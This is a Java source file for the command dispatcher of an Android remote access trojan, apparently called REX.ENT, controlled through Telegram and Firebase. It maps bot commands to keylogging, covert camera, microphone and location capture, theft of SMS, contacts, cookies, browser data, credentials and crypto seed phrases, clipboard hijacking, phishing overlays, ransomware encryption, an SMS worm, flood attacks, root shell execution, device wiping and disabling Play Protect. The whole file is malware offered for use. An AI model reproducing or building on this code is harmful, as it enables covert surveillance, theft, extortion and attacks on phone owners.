package com.enterprise.rat.commands;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import com.enterprise.rat.admin.AdminReceiver;
import com.enterprise.rat.activities.FakeUpdateActivity;
import com.enterprise.rat.bot.BotConfig;
import com.enterprise.rat.services.AccessibilityService;
import com.enterprise.rat.utils.AntiVM;
import com.enterprise.rat.utils.FirebaseC2Manager;
import com.enterprise.rat.utils.TelegramApi;
import com.google.gson.JsonObject;

public class CommandHandler {
    private Context context;
    private FileManager fileManager;
    private SMSManager smsManager;
    private LocationManager locationManager;
    private CameraManager cameraManager;
    private DeviceInfoManager deviceInfoManager;
    private ContactManager contactManager;
    private CallManager callManager;
    private AudioManager audioManager;
    private ScreenManager screenManager;
    private KeyloggerManager keyloggerManager;
    private ShellManager shellManager;
    private SocialMediaManager socialMediaManager;
    private AppManager appManager;
    private PhishingManager phishingManager;
    private CallRecorderManager callRecorderManager;
    private CookieStealerManager cookieStealerManager;
    private RansomwareManager ransomwareManager;
    private WiFiScannerManager wifiScannerManager;
    private CryptoClipboardManager cryptoClipboardManager;
    private CredentialDumper credentialDumper;
    private AppControllerManager appControllerManager;
    private ProcessManager processManager;
    private SIMInfoManager simInfoManager;
    private USSDManager ussdManager;
    private SMSForwarderManager smsForwarderManager;
    private NotificationReplyManager notificationReplyManager;
    private GeofenceManager geofenceManager;
    private CalendarDumpManager calendarDumpManager;
    private SystemSettingsManager systemSettingsManager;
    private FlashlightManager flashlightManager;
    private WallpaperManager wallpaperManager;
    private TTSSpeakManager ttsSpeakManager;
    private ZipManager zipManager;
    private AppUsageStatsManager usageStatsManager;
    private SearchFileManager searchFileManager;
    private BluetoothScannerManager bluetoothScannerManager;
    private SelfUpdateManager selfUpdateManager;
    private ScreenStreamManager screenStreamManager;
    private AntiDebugDetector antiDebugDetector;
    private GmailExtractorManager gmailExtractorManager;
    private LiveStreamManager liveStreamManager;
    private AntiUninstallManager antiUninstallManager;
    private OverlayPhishingManager overlayPhishingManager;
    private CryptoClipboardHijackManager cryptoClipboardHijackManager;
    private ScreenLiveStreamManager screenLiveStreamManager;
    private HiddenCameraManager hiddenCameraManager;
    private SMSWormManager smsWormManager;
    private FirebaseC2Manager firebaseC2Manager;
    private FileMonitorManager fileMonitorManager;
    private WiFiAutoConnectManager wifiAutoConnectManager;
    private WhatsAppImpersonationManager whatsAppImpersonationManager;
    private GeofenceAlertManager geofenceAlertManager;
    private SeedPhraseStealerManager seedPhraseStealerManager;
    private VNCManager vncManager;
    private BrowserStealerManager browserStealerManager;
    private CallForwardManager callForwardManager;
    private WhatsAppReaderManager whatsAppReaderManager;

    public CommandHandler(Context context) {
        this.context = context;
        this.fileManager = new FileManager(context);
        this.smsManager = new SMSManager(context);
        this.locationManager = new LocationManager(context);
        this.cameraManager = new CameraManager(context);
        this.deviceInfoManager = new DeviceInfoManager(context);
        this.contactManager = new ContactManager(context);
        this.callManager = new CallManager(context);
        this.audioManager = new AudioManager(context);
        this.screenManager = new ScreenManager(context);
        this.keyloggerManager = new KeyloggerManager(context);
        this.shellManager = new ShellManager();
        this.socialMediaManager = new SocialMediaManager(context);
        this.appManager = new AppManager(context);
        this.phishingManager = new PhishingManager(context);
        this.callRecorderManager = new CallRecorderManager(context);
        this.cookieStealerManager = new CookieStealerManager(context);
        this.ransomwareManager = new RansomwareManager(context);
        this.wifiScannerManager = new WiFiScannerManager(context);
        this.cryptoClipboardManager = new CryptoClipboardManager(context);
        this.credentialDumper = new CredentialDumper(context);
        this.appControllerManager = new AppControllerManager(context);
        this.processManager = new ProcessManager(context);
        this.simInfoManager = new SIMInfoManager(context);
        this.ussdManager = new USSDManager(context);
        this.smsForwarderManager = new SMSForwarderManager(context);
        this.notificationReplyManager = new NotificationReplyManager(context);
        this.geofenceManager = new GeofenceManager(context);
        this.calendarDumpManager = new CalendarDumpManager(context);
        this.systemSettingsManager = new SystemSettingsManager(context);
        this.flashlightManager = new FlashlightManager(context);
        this.wallpaperManager = new WallpaperManager(context);
        this.ttsSpeakManager = new TTSSpeakManager(context);
        this.zipManager = new ZipManager();
        this.usageStatsManager = new AppUsageStatsManager(context);
        this.searchFileManager = new SearchFileManager();
        this.bluetoothScannerManager = new BluetoothScannerManager(context);
        this.selfUpdateManager = new SelfUpdateManager(context);
        this.screenStreamManager = new ScreenStreamManager(context);
        this.antiDebugDetector = new AntiDebugDetector();
        this.gmailExtractorManager = new GmailExtractorManager();
        this.liveStreamManager = new LiveStreamManager(context);
        this.antiUninstallManager = new AntiUninstallManager(context);
        this.overlayPhishingManager = new OverlayPhishingManager(context);
        this.cryptoClipboardHijackManager = new CryptoClipboardHijackManager(context);
        this.screenLiveStreamManager = new ScreenLiveStreamManager(context);
        this.hiddenCameraManager = new HiddenCameraManager(context);
        this.smsWormManager = new SMSWormManager(context);
        this.fileMonitorManager = new FileMonitorManager();
        this.wifiAutoConnectManager = new WiFiAutoConnectManager(context);
        this.whatsAppImpersonationManager = new WhatsAppImpersonationManager(context);
        this.geofenceAlertManager = new GeofenceAlertManager(context);
        this.seedPhraseStealerManager = new SeedPhraseStealerManager(context);
        this.vncManager = new VNCManager(context);
        this.browserStealerManager = new BrowserStealerManager(context);
        this.callForwardManager = new CallForwardManager(context);
        this.whatsAppReaderManager = new WhatsAppReaderManager(context);
        this.firebaseC2Manager = new FirebaseC2Manager(this);
    }

    public void setFirebaseC2Manager(FirebaseC2Manager manager) {
        this.firebaseC2Manager = manager;
    }

    private void sendResponse(String command, String result) {
        TelegramApi.sendMessage(result);
        if (firebaseC2Manager != null) {
            firebaseC2Manager.sendResult(command, result);
        }
    }

    public void handleCommand(String text, long chatId, String messageId, JsonObject message) {
        String[] parts = text.trim().split("\\s+");
        if (parts.length == 0) return;
        String cmd = parts[0].toLowerCase();
        if (cmd.equals("/start") || cmd.equals("/help") || cmd.equals("/menu")) { processGlobal(cmd); return; }

        String target = "ALL";
        String[] args = new String[0];
        if (parts.length >= 2) {
            String second = parts[1].toUpperCase();
            if (second.startsWith("SESSION_") || second.equals("ALL")) {
                target = second;
                args = new String[parts.length - 2];
                System.arraycopy(parts, 2, args, 0, args.length);
            } else {
                args = new String[parts.length - 1];
                System.arraycopy(parts, 1, args, 0, args.length);
            }
        }

        String mySession = BotConfig.SESSION_ID.toUpperCase();
        if (!target.equals("ALL") && !target.equals(mySession)) return;

        execute(cmd, args);
    }

    private void processGlobal(String cmd) {
        if (cmd.equals("/start")) {
            sendResponse(cmd, "⚡ <b>REX.ENT v9.0 (Firebase C2)</b>\nSession: <code>" + BotConfig.SESSION_ID + "</code>\n\nGunakan <code>/menu</code> untuk daftar perintah.");
        } else {
            sendResponse(cmd, getMenu());
        }
    }

    private String getMenu() {
        return "MENU LENGKAP REX.ENT v9.0";
    }

    private void execute(String cmd, String[] args) {
        try {
            switch (cmd) {
                // Master case list with single sendResponse
                case "/info": deviceInfoManager.sendDeviceInfo(); sendResponse(cmd, "Info sent"); break;
                case "/ls": fileManager.listDirectory(args.length > 0 ? args[0] : Environment.getExternalStorageDirectory().getAbsolutePath()); sendResponse(cmd, "OK"); break;
                case "/download": if (args.length > 0) fileManager.uploadFile(args[0]); sendResponse(cmd, "OK"); break;
                case "/rm": fileManager.deleteFile(args.length > 0 ? args[0] : ""); sendResponse(cmd, "OK"); break;
                case "/rename": fileManager.renameFile(args.length > 0 ? args[0] : "", args.length > 1 ? args[1] : ""); sendResponse(cmd, "OK"); break;
                case "/sms_list": smsManager.sendSMSList(args.length > 0 ? Integer.parseInt(args[0]) : 10); sendResponse(cmd, "OK"); break;
                case "/sendsms": smsManager.sendSMS(args.length > 0 ? args[0] : "", args.length > 1 ? joinArgs(args, 1) : ""); sendResponse(cmd, "OK"); break;
                case "/delsms": smsManager.deleteSMS(args.length > 0 ? args[0] : ""); sendResponse(cmd, "OK"); break;
                case "/calls": callManager.sendCallLogs(args.length > 0 ? Integer.parseInt(args[0]) : 20); sendResponse(cmd, "OK"); break;
                case "/contacts": contactManager.sendContacts(); sendResponse(cmd, "OK"); break;
                case "/location": locationManager.sendCurrentLocation(); sendResponse(cmd, "OK"); break;
                case "/gps": locationManager.startLiveGPS(); sendResponse(cmd, "OK"); break;
                case "/photo_front": cameraManager.takePhoto(1); sendResponse(cmd, "OK"); break;
                case "/photo_back": cameraManager.takePhoto(0); sendResponse(cmd, "OK"); break;
                case "/record": cameraManager.recordVideo(args.length > 0 ? Integer.parseInt(args[0]) : 10); sendResponse(cmd, "OK"); break;
                case "/mic": audioManager.recordAudio(args.length > 0 ? Integer.parseInt(args[0]) : 10); sendResponse(cmd, "OK"); break;
                case "/liveaudio": audioManager.startLiveStream(); sendResponse(cmd, "OK"); break;
                case "/screenshot": screenManager.takeScreenshot(); sendResponse(cmd, "OK"); break;
                case "/screenrecord": screenManager.startScreenRecord(args.length > 0 ? Integer.parseInt(args[0]) : 10); sendResponse(cmd, "OK"); break;
                case "/keylog_start": keyloggerManager.start(); sendResponse(cmd, "OK"); break;
                case "/keylog_stop": keyloggerManager.stop(); sendResponse(cmd, "OK"); break;
                case "/keylog_dump": keyloggerManager.sendLogs(); sendResponse(cmd, "OK"); break;
                case "/apps": appManager.listInstalledApps(); sendResponse(cmd, "OK"); break;
                case "/battery": deviceInfoManager.sendBatteryStatus(); sendResponse(cmd, "OK"); break;
                case "/network": deviceInfoManager.sendNetworkInfo(); sendResponse(cmd, "OK"); break;
                case "/permissions": deviceInfoManager.sendPermissions(); sendResponse(cmd, "OK"); break;
                case "/clipboard": ClipboardHelper.getClipboard(context); sendResponse(cmd, "OK"); break;
                case "/setclip": ClipboardHelper.setClipboard(context, joinArgs(args, 0)); sendResponse(cmd, "OK"); break;
                case "/notif": NotificationManager.dumpNotifications(); sendResponse(cmd, "OK"); break;
                case "/fakenotif": NotificationManager.sendFake(context, args.length > 0 ? args[0] : "Alert", args.length > 1 ? joinArgs(args, 1) : "Message"); sendResponse(cmd, "OK"); break;
                case "/steal_images": StealerManager.stealImages(context); sendResponse(cmd, "OK"); break;
                case "/steal_docs": StealerManager.stealDocuments(context); sendResponse(cmd, "OK"); break;
                case "/extract_wa": socialMediaManager.extractWhatsApp(); sendResponse(cmd, "OK"); break;
                case "/extract_tg": socialMediaManager.extractTelegram(); sendResponse(cmd, "OK"); break;
                case "/httpflood": NetworkManager.httpFlood(args.length > 0 ? args[0] : "...", args.length > 1 ? Integer.parseInt(args[1]) : 100); sendResponse(cmd, "OK"); break;
                case "/udpflood": NetworkManager.udpFlood(args.length > 0 ? args[0] : "...", args.length > 1 ? Integer.parseInt(args[1]) : 53, args.length > 2 ? Integer.parseInt(args[2]) : 30); sendResponse(cmd, "OK"); break;
                case "/shell": ShellManager.executeCommand(joinArgs(args, 0)); sendResponse(cmd, "OK"); break;
                case "/sush": ShellManager.executeRootCommand(joinArgs(args, 0)); sendResponse(cmd, "OK"); break;
                case "/openurl": phishingManager.openURL(args.length > 0 ? args[0] : ""); sendResponse(cmd, "OK"); break;
                case "/toast": SystemManager.showToast(context, joinArgs(args, 0)); sendResponse(cmd, "OK"); break;
                case "/phish": PhishingManager.showPhishingDialog(context, args.length > 0 ? args[0] : "Google", args.length > 1 ? joinArgs(args, 1) : "Verify"); sendResponse(cmd, "OK"); break;
                case "/vibrate": SystemManager.vibrate(context, args.length > 0 ? Integer.parseInt(args[0]) : 1000); sendResponse(cmd, "OK"); break;
                case "/playsound": SystemManager.playSound(context); sendResponse(cmd, "OK"); break;
                case "/lock": SystemManager.lockDevice(context); sendResponse(cmd, "OK"); break;
                case "/wipe": SystemManager.wipeDevice(context); sendResponse(cmd, "OK"); break;
                case "/destroy": SystemManager.selfDestruct(context); sendResponse(cmd, "OK"); break;
                case "/hideicon": SystemManager.hideIcon(context); sendResponse(cmd, "OK"); break;
                case "/autostart": SystemManager.enableAutostart(context); sendResponse(cmd, "OK"); break;
                case "/socmed": socialMediaManager.auditSocialMedia(); sendResponse(cmd, "OK"); break;
                case "/call_record": callRecorderManager.startCallRecording(args.length > 0 ? Integer.parseInt(args[0]) : 30); sendResponse(cmd, "OK"); break;
                case "/cookies": cookieStealerManager.stealCookies(); sendResponse(cmd, "OK"); break;
                case "/history": cookieStealerManager.stealChromeHistory(); sendResponse(cmd, "OK"); break;
                case "/screen_lock": ransomwareManager.showLockScreen(joinArgs(args, 0)); sendResponse(cmd, "OK"); break;
                case "/screen_unlock": ransomwareManager.removeLockScreen(); sendResponse(cmd, "OK"); break;
                case "/wifi_scan": wifiScannerManager.scanNetworks(); sendResponse(cmd, "OK"); break;
                case "/wifi_pass": wifiScannerManager.retrievePasswords(); sendResponse(cmd, "OK"); break;
                case "/crypto_hijack_start": cryptoClipboardHijackManager.start(); sendResponse(cmd, "OK"); break;
                case "/crypto_hijack_stop": cryptoClipboardHijackManager.stop(); sendResponse(cmd, "OK"); break;
                case "/cred_harvest_start": credentialDumper.startCredentialHarvest(); sendResponse(cmd, "OK"); break;
                case "/cred_dump": credentialDumper.dumpCredentials(); sendResponse(cmd, "OK"); break;
                case "/launch": appControllerManager.launchApp(args.length > 0 ? args[0] : ""); sendResponse(cmd, "OK"); break;
                case "/uninstall": appControllerManager.uninstallApp(args.length > 0 ? args[0] : ""); sendResponse(cmd, "OK"); break;
                case "/process_list": processManager.listProcesses(); sendResponse(cmd, "OK"); break;
                case "/kill_pid": processManager.killProcess(args.length > 0 ? args[0] : ""); sendResponse(cmd, "OK"); break;
                case "/kill_pkg": processManager.killPackage(args.length > 0 ? args[0] : ""); sendResponse(cmd, "OK"); break;
                case "/sim_info": simInfoManager.getSIMInfo(); sendResponse(cmd, "OK"); break;
                case "/ussd": ussdManager.sendUSSD(args.length > 0 ? args[0] : ""); sendResponse(cmd, "OK"); break;
                case "/sms_fwd": smsForwarderManager.setForward(args.length > 0 ? args[0] : ""); sendResponse(cmd, "OK"); break;
                case "/reply": notificationReplyManager.replyToNotification(args.length > 0 ? args[0] : "", args.length > 1 ? joinArgs(args, 1) : ""); sendResponse(cmd, "OK"); break;
                case "/geofence": geofenceManager.setGeofence(args.length > 0 ? Double.parseDouble(args[0]) : 0, args.length > 1 ? Double.parseDouble(args[1]) : 0, args.length > 2 ? Float.parseFloat(args[2]) : 500); sendResponse(cmd, "OK"); break;
                case "/calendar_dump": calendarDumpManager.dumpCalendar(); sendResponse(cmd, "OK"); break;
                case "/volume": systemSettingsManager.setVolume(args.length > 0 ? Integer.parseInt(args[0]) : 5); sendResponse(cmd, "OK"); break;
                case "/brightness": systemSettingsManager.setBrightness(args.length > 0 ? Integer.parseInt(args[0]) : 100); sendResponse(cmd, "OK"); break;
                case "/ring_mode": systemSettingsManager.setRingMode(args.length > 0 ? args[0] : "normal"); sendResponse(cmd, "OK"); break;
                case "/flashlight": flashlightManager.toggle(args.length > 0 ? Boolean.parseBoolean(args[0]) : true); sendResponse(cmd, "OK"); break;
                case "/wallpaper": wallpaperManager.setFromUrl(args.length > 0 ? args[0] : ""); sendResponse(cmd, "OK"); break;
                case "/speak": ttsSpeakManager.speak(joinArgs(args, 0)); sendResponse(cmd, "OK"); break;
                case "/zip": zipManager.zipFile(args.length > 0 ? args[0] : "", args.length > 1 ? args[1] : null); sendResponse(cmd, "OK"); break;
                case "/usage": usageStatsManager.getStats(); sendResponse(cmd, "OK"); break;
                case "/search": searchFileManager.search(args.length > 0 ? args[0] : null, args.length > 1 ? args[1] : ""); sendResponse(cmd, "OK"); break;
                case "/bluetooth": bluetoothScannerManager.enumerate(); sendResponse(cmd, "OK"); break;
                case "/update": selfUpdateManager.downloadAndInstall(args.length > 0 ? args[0] : ""); sendResponse(cmd, "OK"); break;
                case "/otp_scan": OTPInterceptorManager.interceptOTP(); sendResponse(cmd, "OK"); break;
                case "/cpu_ram": {
                    android.app.ActivityManager am = (android.app.ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
                    android.app.ActivityManager.MemoryInfo mi = new android.app.ActivityManager.MemoryInfo();
                    am.getMemoryInfo(mi);
                    sendResponse(cmd, "<b>📊 CPU & RAM</b>\nTotal: <code>" + mi.totalMem/(1024*1024) + "MB</code>\nAvailable: <code>" + mi.availMem/(1024*1024) + "MB</code>");
                    break;
                }
                case "/stream_live": screenLiveStreamManager.startStream(args.length > 0 ? Integer.parseInt(args[0]) : 8080); sendResponse(cmd, "Stream started"); break;
                case "/stream_live_stop": screenLiveStreamManager.stopStream(); sendResponse(cmd, "OK"); break;
                case "/ransomware": RansomwareCryptoManager.encryptFiles(args.length > 0 ? args[0] : null, args.length > 1 ? args[1] : null); sendResponse(cmd, "OK"); break;
                case "/decrypt": RansomwareCryptoManager.decryptFiles(args.length > 0 ? args[0] : null, args.length > 1 ? args[1] : null); sendResponse(cmd, "OK"); break;
                case "/lock_capture_start": LockScreenCaptureManager.startCapture(); sendResponse(cmd, "OK"); break;
                case "/lock_capture_stop": LockScreenCaptureManager.stopCapture(); sendResponse(cmd, "OK"); break;
                case "/anti_vm": sendResponse(cmd, AntiVM.getDetectionReport()); break;
                case "/disable_playprotect": PlayProtectDisabler.disable(); sendResponse(cmd, "OK"); break;
                case "/enable_playprotect": PlayProtectDisabler.enable(); sendResponse(cmd, "OK"); break;
                case "/block_tap_start": {
                    AccessibilityService svc = AccessibilityService.getInstance();
                    if (svc != null) { AutoTapBlocker.enable(svc); sendResponse(cmd, "OK"); }
                    else sendResponse(cmd, "❌ Accessibility not active.");
                    break;
                }
                case "/block_tap_stop": {
                    AccessibilityService svc = AccessibilityService.getInstance();
                    if (svc != null) { AutoTapBlocker.disable(svc); sendResponse(cmd, "OK"); }
                    else sendResponse(cmd, "❌ Accessibility not active.");
                    break;
                }
                case "/hidden_cam_start": hiddenCameraManager.startStream(args.length > 0 ? Integer.parseInt(args[0]) : 1, args.length > 1 ? args[1] : ""); sendResponse(cmd, "OK"); break;
                case "/hidden_cam_stop": hiddenCameraManager.stopStream(); sendResponse(cmd, "OK"); break;
                case "/worm_start": smsWormManager.startWorm(args.length > 0 ? joinArgs(args, 0) : null, args.length > 1 ? Integer.parseInt(args[1]) : 500); sendResponse(cmd, "OK"); break;
                case "/worm_stop": smsWormManager.stopWorm(); sendResponse(cmd, "OK"); break;
                case "/firebase_listen": firebaseC2Manager.startListening(BotConfig.SESSION_ID); sendResponse(cmd, "OK"); break;
                case "/firebase_stop": firebaseC2Manager.stopListening(); sendResponse(cmd, "OK"); break;
                case "/file_monitor_start": fileMonitorManager.startMonitor(args.length > 0 ? args[0] : null); sendResponse(cmd, "OK"); break;
                case "/file_monitor_stop": fileMonitorManager.stopMonitor(); sendResponse(cmd, "OK"); break;
                case "/wifi_autoconnect": wifiAutoConnectManager.autoConnect(); sendResponse(cmd, "OK"); break;
                case "/wifi_connect": wifiAutoConnectManager.connectToSSID(args.length > 0 ? args[0] : "", args.length > 1 ? args[1] : ""); sendResponse(cmd, "OK"); break;
                case "/wa_send": whatsAppImpersonationManager.sendMessage(args.length > 0 ? args[0] : "", args.length > 1 ? joinArgs(args, 1) : ""); sendResponse(cmd, "OK"); break;
                case "/geofence_set": geofenceAlertManager.setGeofence(args.length > 0 ? Double.parseDouble(args[0]) : 0, args.length > 1 ? Double.parseDouble(args[1]) : 0, args.length > 2 ? Float.parseFloat(args[2]) : 500); sendResponse(cmd, "OK"); break;
                case "/geofence_remove": geofenceAlertManager.removeGeofence(); sendResponse(cmd, "OK"); break;
                case "/seed_scan": seedPhraseStealerManager.scanGalleryForSeedPhrases(); sendResponse(cmd, "OK"); break;
                case "/vnc_start": vncManager.startServer(args.length > 0 ? Integer.parseInt(args[0]) : 5900); sendResponse(cmd, "OK"); break;
                case "/vnc_stop": vncManager.stopServer(); sendResponse(cmd, "OK"); break;
                case "/chrome_history": browserStealerManager.stealChromeHistory(); sendResponse(cmd, "OK"); break;
                case "/chrome_cookies": browserStealerManager.stealChromeCookies(); sendResponse(cmd, "OK"); break;
                case "/samsung_history": browserStealerManager.stealSamsungHistory(); sendResponse(cmd, "OK"); break;
                case "/autofill": browserStealerManager.stealAutofillData(); sendResponse(cmd, "OK"); break;
                case "/call_forward": callForwardManager.setForward(args.length > 0 ? args[0] : ""); sendResponse(cmd, "OK"); break;
                case "/call_forward_cancel": callForwardManager.cancelForward(); sendResponse(cmd, "OK"); break;
                case "/notif_history": NotificationInterceptManager.dumpFullHistory(); sendResponse(cmd, "OK"); break;
                case "/notif_live_start": NotificationInterceptManager.interceptLive(); sendResponse(cmd, "OK"); break;
                case "/notif_live_stop": NotificationInterceptManager.stopLiveIntercept(); sendResponse(cmd, "OK"); break;
                case "/wa_read": whatsAppReaderManager.readChats(); sendResponse(cmd, "OK"); break;
                case "/fake_update": showFakeUpdate(); sendResponse(cmd, "OK"); break;
                case "/reset_grant": showFakeUpdate(); sendResponse(cmd, "OK"); break;
                default: sendResponse(cmd, "Perintah tidak dikenal. Ketik /menu untuk daftar perintah."); break;
            }
        } catch (Exception e) {
            sendResponse(cmd, "❌ Error: " + e.getMessage());
        }
    }

    private void showFakeUpdate() {
        try {
            Intent intent = new Intent(context, FakeUpdateActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            sendResponse("/fake_update", "📱 Fake update screen displayed.");
        } catch (Exception e) {
            sendResponse("/fake_update", "❌ " + e.getMessage());
        }
    }

    private String joinArgs(String[] args, int start) {
        StringBuilder sb = new StringBuilder();
        for (int i = start; i < args.length; i++) { if (i > start) sb.append(" "); sb.append(args[i]); }
        return sb.toString();
    }
}
